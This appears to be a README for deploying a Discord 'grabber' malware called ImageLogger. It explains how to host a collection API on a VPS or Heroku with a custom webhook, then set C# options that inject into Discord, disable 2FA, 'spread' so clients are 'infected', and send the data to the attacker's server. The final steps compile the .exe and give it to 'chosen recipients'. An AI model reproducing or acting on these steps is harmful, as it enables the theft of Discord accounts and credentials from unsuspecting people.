## Instructions for Deployment

### Method #1: VPS-based API Hosting

#### Step 1: VPS Provisioning
- Establishing a Virtual Private Server (VPS) is imperative for this approach.

#### Step 2: Port Exposure and Server Setup
- Inaugurate the ingress of traffic through port 80.
- Install Apache2 by executing the commands:
  ```
  $ sudo apt-get update
  $ sudo apt-get install apache2
  ```
- Test the server's responsiveness with:
  ```
  $ curl urserverurl
  ```
  
#### Step 3: Firewall Configuration
- Permit Apache to operate freely via:
  ```
  $ sudo ufw allow 'Apache'
  ```
- Confirm the modification's effectiveness:
  ```
  $ sudo ufw status
  ```

#### Step 4: API Installation
- Secure the API repository:
  ```
  $ git clone https://github.com/Stanley-GF/api.git
  ```

#### Step 5: Configuration of Index.js
- Navigate to the API directory:
  ```
  $ cd api
  ```
- Open and modify the main index.js file:
  ```
  $ nano index.js
  ```
- Configure port and IP settings in index.js file to suit your requirements.

#### Step 6: Webhook URL Integration
- Traverse to the endpoints subdirectory:
  ```
  $ cd api/endpoints
  ```
- Access the index.js file for configuration:
  ```
  $ nano index.js
  ```
- Customize the webhook URL to align with your specifications.

#### Step 7: Final URL
- The culmination of this intricate endeavor yields your API URL:
  ```
  http://your-vps-ip/api/v1/send
  ```
  Replace "your-vps-ip" with your actual VPS IP address.


### Method #2: The Heroku Solution (Ideal for Novices)

1. Embark on the Journey: 
   - Initiate the process by navigating to https://heroku.com.
   - Initiate your journey by registering for a new account.

2. App Conception:
   - Foster the inception of an application within the Heroku interface.

3. Harness the Power of GitHub:
   - Forge a connection between your Heroku endeavor and the GitHub realm by forking the repository located at https://github.com/Stanley-GF/api to your GitHub account.
   - Navigate to the "endpoints" directory within the repository.
   - Within the "index.js" file, unleash your creative prowess by replacing the default webhook URL with your bespoke one.

4. Deployment Decree:
   - Engage with the Heroku dashboard, accessible through https://dashboard.heroku.com/apps/.
   - Select the app you've meticulously crafted.
   - Within the "deploy" category, allow your gaze to settle on the concept of "deployment methods."
   - Evoke the magic of GitHub by opting for it as your preferred deployment method.
   - Initiate the harmonious connection between your Heroku realm and your GitHub realm by navigating through the OAuth authorization process.
   - Identify your repository by typing "api" in the "App Connected" search field and selecting your cherished project.
   - Bestow the gift of automation upon your deployment process by activating the "Automatic Deploy" feature.
   - Initiate the transformative ritual by pressing the "Deploy Branch" button.

5. The Grand Unveiling:
   - Witness the metamorphosis of your creation into a live server. Behold its URL:
     ```
     https://your-app-name.herokuapp.com/api/v1/send
     ```
     Replace "your-app-name" with your chosen app's title.

In this realm of simplicity, Heroku extends its hand to guide you through the enigmatic process of server deployment. With the orchestration of each step, you manifest your digital domain, one URL at a time.


## Alternative Approach: Executable Transformation

1. Project Assimilation:
   - Begin by acquiring the source code of the designated project.

2. Project Immersion:
   - Unveil the layers of the project by opening it within a suitable environment.
   - Within the realms of "settings.cs," beckon forth a world of customization:

```cs
public static bool disableMfa = false; // Disable 2-Factor Authentication (2FA).

public static bool restartDiscord = true; // Facilitate the renaissance of Discord post-injection.

public static bool spread = true; // A tenet eternally true: the client must be infected.

private static string serverurl = "https://your-app-name.herokuapp.com/api/v1/send"; // Transmute "your-app-name.herokuapp.com/api/v1/send" into your own API URL.

public static string Url = "https://cors-anywhere2.herokuapp.com/" + serverurl; // This thread woven in the fabric of connectivity shall remain untouched.
```

3. Genesis of the .exe:
   - Weave the threads of code into the tapestry of functionality by compiling the project.

4. The Reckoning:
   - Traverse the directory path `\ImageLogger\ImageLogger\bin\Debug`.

5. The Gift of Dissemination:
   - With your creation encapsulated within the .exe form, bestow it upon your chosen recipients.

6. Glimpses of Capture:
   - Immortalize the moments of intrigue with visual records that capture the essence of the grabber's potential.
